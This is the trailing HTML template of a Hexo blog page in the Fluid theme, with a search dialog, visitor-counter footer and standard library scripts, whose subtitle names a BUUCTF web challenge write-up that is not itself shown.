    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
  
  <br>



    


    <!-- cnzz Analytics icon -->
    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/lib/jquery/jquery.min.js" ></script>
<script src="/lib/popper/popper.min.js" ></script>
<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/js/main.js" ></script>


  <script src="/js/lazyload.js" ></script>



  
    <script src="/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/js/post.js" ></script>



  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  

  

  

  <!-- cnzz Analytics -->
  





  <script src="/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "BUUCTF WEB wp&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
